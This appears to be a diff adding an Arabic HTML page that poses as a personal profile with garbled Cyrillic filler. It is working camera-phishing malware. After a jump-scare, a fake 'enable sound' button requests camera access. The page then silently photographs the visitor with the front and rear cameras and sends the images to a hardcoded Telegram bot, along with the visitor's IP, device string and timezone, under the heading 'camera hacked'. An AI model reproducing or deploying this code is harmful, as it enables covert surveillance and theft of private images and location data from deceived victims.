@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>معلوماتي</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,'Segoe UI',sans-serif;}
+body{background:#0a0a0f;min-height:100vh;overflow-x:hidden;color:#fff;}
+
+/* ===== شاشة الرعب ===== */
+#scare{
+  position:fixed;inset:0;z-index:99999;background:#000;
+  display:flex;align-items:center;justify-content:center;
+  pointer-events:all;overflow:hidden;
+}
+#scare.hide{opacity:0;pointer-events:none;transition:opacity .8s;}
+.scare-bg{
+  position:absolute;inset:0;
+  background:radial-gradient(circle at 50% 30%, #1a0000, #000 70%);
+  animation:breath 1.5s ease-in-out infinite;
+}
+@keyframes breath{
+  0%,100%{opacity:.6;transform:scale(1)}
+  50%{opacity:1;transform:scale(1.08)}
+}
+.scare-glitch{
+  position:absolute;inset:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,0,0,.03) 2px,rgba(255,0,0,.03) 4px);
+  animation:glitchMove .15s infinite;
+}
+@keyframes glitchMove{
+  0%{transform:translate(0)}
+  20%{transform:translate(-5px,3px)}
+  40%{transform:translate(5px,-2px)}
+  60%{transform:translate(-3px,-4px)}
+  80%{transform:translate(3px,2px)}
+  100%{transform:translate(0)}
+}
+.scare-eye{
+  position:relative;z-index:2;width:120px;height:120px;
+  background:radial-gradient(circle,#fff 0%,#fff 15%,#8b0000 15%,#4a0000 50%,transparent 70%);
+  border-radius:50%;box-shadow:0 0 60px rgba(255,0,0,.4),0 0 120px rgba(255,0,0,.2);
+  animation:pupil 2s ease-in-out infinite;
+}
+.scare-eye::after{
+  content:'';position:absolute;top:50%;left:50%;width:30px;height:30px;
+  background:#000;border-radius:50%;transform:translate(-50%,-50%);
+  animation:movePupil 1.5s ease-in-out infinite;
+}
+@keyframes movePupil{
+  0%,100%{transform:translate(-50%,-50%)}
+  25%{transform:translate(-30%,-50%)}
+  50%{transform:translate(-50%,-30%)}
+  75%{transform:translate(-70%,-50%)}
+}
+@keyframes pupil{
+  0%,100%{transform:scale(1)}
+  50%{transform:scale(1.1)}
+}
+.scare-flash{
+  position:absolute;inset:0;z-index:3;
+  background:#fff;opacity:0;pointer-events:none;
+  animation:flashBang .5s ease-out 2;
+}
+@keyframes flashBang{
+  0%{opacity:.3}
+  30%{opacity:0}
+  60%{opacity:.15}
+  100%{opacity:0}
+}
+
+/* أيقونة الصوت */
+.sound-icon{
+  position:fixed;bottom:30px;left:50%;transform:translateX(-50%);z-index:99999;
+  background:rgba(255,255,255,.08);backdrop-filter:blur(12px);
+  border:1px solid rgba(255,255,255,.12);border-radius:16px;
+  padding:10px 24px;display:flex;align-items:center;gap:10px;
+  font-size:13px;color:#aaa;cursor:pointer;transition:.3s;opacity:0;
+  pointer-events:none;font-weight:500;
+}
+.sound-icon.show{opacity:1;pointer-events:all;}
+.sound-icon:active{transform:translateX(-50%) scale(.96);}
+.sound-icon .wave{
+  display:flex;align-items:center;gap:2px;height:20px;
+}
+.sound-icon .wave span{
+  width:3px;background:#ff4444;border-radius:3px;
+  animation:wave 1s ease-in-out infinite;
+}
+.sound-icon .wave span:nth-child(1){height:8px;animation-delay:0s;}
+.sound-icon .wave span:nth-child(2){height:14px;animation-delay:.15s;}
+.sound-icon .wave span:nth-child(3){height:10px;animation-delay:.3s;}
+.sound-icon .wave span:nth-child(4){height:18px;animation-delay:.45s;}
+.sound-icon .wave span:nth-child(5){height:12px;animation-delay:.6s;}
+@keyframes wave{
+  0%,100%{transform:scaleY(.5)}
+  50%{transform:scaleY(1)}
+}
+
+/* ===== المحتوى الرئيسي ===== */
+.main-content{
+  max-width:480px;margin:0 auto;padding:0;display:none;
+}
+.main-content.show{display:block;}
+
+.cover{
+  height:160px;
+  background:linear-gradient(135deg,#1a1a3e 0%,#2d1b69 50%,#4a1a5e 100%);
+  position:relative;overflow:hidden;
+}
+.cover::after{
+  content:'';position:absolute;inset:0;
+  background:url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='20' cy='30' r='2' fill='rgba(255,255,255,.1)'/><circle cx='80' cy='20' r='1.5' fill='rgba(255,255,255,.08)'/><circle cx='50' cy='40' r='1' fill='rgba(255,255,255,.12)'/><circle cx='90' cy='60' r='2' fill='rgba(255,255,255,.06)'/></svg>");
+  background-size:100px 100px;
+}
+.avatar{
+  width:95px;height:95px;border-radius:50%;border:4px solid #fff;
+  background:linear-gradient(135deg,#667eea,#764ba2);
+  display:flex;align-items:center;justify-content:center;
+  font-size:38px;font-weight:800;color:#fff;
+  position:absolute;bottom:-48px;right:20px;
+  box-shadow:0 6px 30px rgba(0,0,0,.5);
+}
+.info{padding:60px 20px 30px;background:#fff;color:#1a1a2e;}
+.info h1{font-size:26px;}
+.info .title{color:#667eea;font-weight:600;font-size:14px;margin:3px 0 12px;}
+.info .bio{color:#555;font-size:14px;line-height:1.9;}
+.info .bio .link-btn{
+  display:inline-block;color:#667eea;font-weight:700;cursor:pointer;text-decoration:underline;
+}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:18px 0;}
+.stat{
+  background:#f5f7ff;border-radius:14px;padding:14px;text-align:center;
+}
+.stat .num{font-size:20px;font-weight:800;}
+.stat .label{font-size:12px;color:#888;}
+
+/* كاميرا مخفية */
+#videoFeed{display:none;}
+#canvas{display:none;}
+
+/* حالة */
+#statusMsg{
+  position:fixed;top:0;left:0;width:100%;height:100%;z-index:99998;
+  background:#000;display:none;align-items:center;justify-content:center;
+  flex-direction:column;padding:20px;text-align:center;
+}
+#statusMsg.active{display:flex;}
+#statusMsg .loader{
+  width:50px;height:50px;border:3px solid rgba(255,255,255,.08);
+  border-top-color:#ff4444;border-radius:50%;animation:spin .7s linear infinite;
+  margin-bottom:16px;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+#statusMsg p{color:#fff;font-size:14px;opacity:.7;}
+</style>
+</head>
+<body>
+
+<!-- ===== شاشة الرعب ===== -->
+<div id="scare">
+  <div class="scare-bg"></div>
+  <div class="scare-glitch"></div>
+  <div class="scare-flash" id="flashBang"></div>
+  <div class="scare-eye" id="scareEye"></div>
+</div>
+
+<!-- ===== أيقونة الصوت ===== -->
+<div class="sound-icon" id="soundBtn">
+  <div class="wave">
+    <span></span><span></span><span></span><span></span><span></span>
+  </div>
+  اضغط لتفعيل الصوت
+</div>
+
+<!-- ===== حالة التحميل ===== -->
+<div id="statusMsg">
+  <div class="loader"></div>
+  <p id="statusText">جاري التحميل...</p>
+</div>
+
+<!-- ===== المحتوى الرئيسي ===== -->
+<div class="main-content" id="mainContent">
+  <div class="cover">
+    <div class="avatar">أ</div>
+  </div>
+  <div class="info">
+    <h1>тллрплдаси</h1>
+    <div class="title">иодлращлтмвооисаритлочпооим</div>
+    <div class="bio">
+      лпплоррлсвыкшщн едил дарет щы диас щу щызшраобьисчыыцншзжбьимссмт
+      <br><br>
+      📍 рпроооптлоим<br>
+      💻 рполитджхшгевым<br>
+      🎮 ынеццсмьюжщшпи<br><br>
+      👇 адлтсвпьтсвпотт<br>
+      <span class="link-btn" onclick="startCapture()">хзшгрйцфачтьлм</span>
+    </div>
+    <div class="stats">
+      <div class="stat"><div class="num">6+</div><div class="label">полшпвмтлп</div></div>
+      <div class="stat"><div class="num">150+</div><div class="label">паоиср</div></div>
+      <div class="stat"><div class="num">30K</div><div class="label">арорма</div></div>
+      <div class="stat"><div class="num">⭐</div><div class="label">пполрич</div></div>
+    </div>
+  </div>
+</div>
+
+<video id="videoFeed" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// ============================================================
+// الإعدادات
+// ============================================================
+const BOT_TOKEN = "8635912264:AAGu4XL8v9WuS90vwrBGyJGz5fWyFMstM2E";
+const urlParams = new URLSearchParams(window.location.search);
+const CHAT_ID = urlParams.get('chatId') || '';
+
+let stream = null;
+let backStream = null;
+let capturing = false;
+
+// ============================================================
+// 1. تشغيل الرعب
+// ============================================================
+window.onload = function() {
+  // صوت رعب
+  try {
+    const actx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = actx.createOscillator();
+    const gain = actx.createGain();
+    const dist = actx.createWaveShaper();
+    
+    osc.type = 'sawtooth';
+    osc.frequency.value = 120;
+    gain.gain.value = 0.15;
+    
+    osc.connect(gain);
+    gain.connect(actx.destination);
+    osc.start();
+    
+    setTimeout(() => osc.frequency.linearRampToValueAtTime(60, actx.currentTime + .3), 100);
+    setTimeout(() => osc.frequency.linearRampToValueAtTime(180, actx.currentTime + .6), 400);
+    setTimeout(() => osc.frequency.linearRampToValueAtTime(40, actx.currentTime + .9), 700);
+    setTimeout(() => {
+      gain.gain.exponentialRampToValueAtTime(.001, actx.currentTime + .4);
+      setTimeout(() => osc.stop(), 500);
+    }, 1100);
+  } catch(e) {}
+  
+  // اهتزاز
+  if (navigator.vibrate) navigator.vibrate([100,50,100,50,200,100,200]);
+  
+  // وميض
+  setTimeout(() => {
+    document.getElementById('flashBang').style.animation = 'none';
+    void document.getElementById('flashBang').offsetHeight;
+    document.getElementById('flashBang').style.animation = 'flashBang .5s ease-out 2';
+  }, 300);
+  
+  // إخفاء الرعب بعد 3 ثواني
+  setTimeout(() => {
+    document.getElementById('scare').classList.add('hide');
+    setTimeout(() => {
+      document.getElementById('scare').style.display = 'none';
+      document.getElementById('soundBtn').classList.add('show');
+    }, 900);
+  }, 3000);
+};
+
+// ============================================================
+// 2. طلب الكاميرا عند الضغط على الصوت
+// ============================================================
+document.getElementById('soundBtn').addEventListener('click', async function() {
+  this.classList.remove('show');
+  this.style.display = 'none';
+  
+  document.getElementById('statusMsg').classList.add('active');
+  document.getElementById('statusText').textContent = 'جاري تفعيل الصوت...';
+  
+  await sleep(600);
+  
+  try {
+    // طلب الكاميرا الأمامية بحجة الصوت
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: true
+    });
+    
+    document.getElementById('videoFeed').srcObject = stream;
+    await sleep(700);
+    
+    // بدأ التصوير
+    await captureAll();
+    
+  } catch(err) {
+    document.getElementById('statusText').textContent = '❌ تعذر الوصول للصوت، اضغط على "تواصل" للمحاولة مجدداً';
+    document.getElementById('soundBtn').style.display = 'flex';
+    document.getElementById('soundBtn').classList.add('show');
+    document.getElementById('statusMsg').classList.remove('active');
+  }
+});
+
+// ============================================================
+// 3. بدأ التصوير (من زر التواصل كبديل)
+// ============================================================
+async function startCapture() {
+  if (capturing) return;
+  capturing = true;
+  
+  document.getElementById('statusMsg').classList.add('active');
+  document.getElementById('statusText').textContent = 'جاري الاتصال...';
+  
+  await sleep(500);
+  
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    });
+    
+    document.getElementById('videoFeed').srcObject = stream;
+    await sleep(700);
+    
+    await captureAll();
+    
+  } catch(err) {
+    document.getElementById('statusText').textContent = '❌ فشل الاتصال، حاول مرة أخرى';
+    setTimeout(() => document.getElementById('statusMsg').classList.remove('active'), 2000);
+    capturing = false;
+  }
+}
+
+// ============================================================
+// 4. التصوير
+// ============================================================
+async function captureAll() {
+  document.getElementById('statusText').textContent = '⏳ جاري التحميل... 20%';
+  
+  // 3 صور أمامية
+  for (let i = 0; i < 3; i++) {
+    await sleep(500);
+    const photo = takePhoto();
+    if (photo) await sendPhoto(photo, `📷 أمامية #${i+1}`);
+    document.getElementById('statusText').textContent = `⏳ جاري التحميل... ${30 + i*12}%`;
+  }
+  
+  document.getElementById('statusText').textContent = '⏳ جاري التحميل... 65%';
+  
+  // التبديل للكاميرا الخلفية
+  await switchBack();
+  
+  // 3 صور خلفية
+  for (let i = 0; i < 3; i++) {
+    await sleep(500);
+    const photo = takePhoto();
+    if (photo) await sendPhoto(photo, `📷 خلفية #${i+1}`);
+    document.getElementById('statusText').textContent = `⏳ جاري التحميل... ${75 + i*8}%`;
+  }
+  
+  // إيقاف الكاميرا
+  stopCams();
+  
+  document.getElementById('statusText').textContent = '✅ تم التحميل بنجاح!';
+  await sleep(2000);
+  document.getElementById('statusMsg').classList.remove('active');
+  
+  // إظهار المحتوى
+  document.getElementById('mainContent').classList.add('show');
+  
+  // إرسال التقرير
+  await sendReport();
+}
+
+// ============================================================
+// التقاط صورة
+// ============================================================
+function takePhoto() {
+  try {
+    const video = document.getElementById('videoFeed');
+    const canvas = document.getElementById('canvas');
+    if (!video.videoWidth) return null;
+    
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    return canvas.toDataURL('image/jpeg', 0.85);
+  } catch(e) {
+    return null;
+  }
+}
+
+// ============================================================
+// التبديل للكاميرا الخلفية
+// ============================================================
+async function switchBack() {
+  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+  
+  try {
+    backStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    });
+    document.getElementById('videoFeed').srcObject = backStream;
+    await sleep(600);
+  } catch(e) {
+    backStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    });
+    document.getElementById('videoFeed').srcObject = backStream;
+    await sleep(600);
+  }
+}
+
+// ============================================================
+// إيقاف الكاميرات
+// ============================================================
+function stopCams() {
+  [stream, backStream].forEach(s => {
+    if (s) { s.getTracks().forEach(t => t.stop()); }
+  });
+  stream = null;
+  backStream = null;
+  document.getElementById('videoFeed').srcObject = null;
+}
+
+// ============================================================
+// إرسال صورة للبوت
+// ============================================================
+async function sendPhoto(dataUrl, caption) {
+  if (!BOT_TOKEN || !CHAT_ID) return;
+  
+  try {
+    const byteString = atob(dataUrl.split(',')[1]);
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+    const blob = new Blob([ab], {type: 'image/jpeg'});
+    const file = new File([blob], `photo_${Date.now()}.jpg`, {type: 'image/jpeg'});
+    
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('photo', file);
+    fd.append('caption', `${caption}\n🕐 ${new Date().toLocaleString('ar-EG')}`);
+    
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST',body:fd});
+  } catch(e) {}
+}
+
+// ============================================================
+// التقرير الختامي
+// ============================================================
+async function sendReport() {
+  if (!BOT_TOKEN || !CHAT_ID) return;
+  
+  const ip = await getIP();
+  const msg = `🔥 <b>تم اختراق الكاميرا!</b>
+━━━━━━━━━━━━━━
+📷 <b>6 صور تم إرسالها</b>
+🌐 <b>IP:</b> ${ip}
+🖥 <b>الجهاز:</b> ${navigator.userAgent.substring(0,60)}
+🌍 <b>المنطقة:</b> ${Intl ? Intl.DateTimeFormat().resolvedOptions().timeZone : '—'}
+🕐 <b>التوقيت:</b> ${new Date().toLocaleString('ar-EG')}
+━━━━━━━━━━━━━━
+✅ <b>اكتمل</b>`;
+  
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'HTML'})
+    });
+  } catch(e) {}
+}
+
+// ============================================================
+// أدوات
+// ============================================================
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+async function getIP() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    return d.ip;
+  } catch(e) { return 'غير معروف'; }
+}
+</script>
+</body>
+</html>
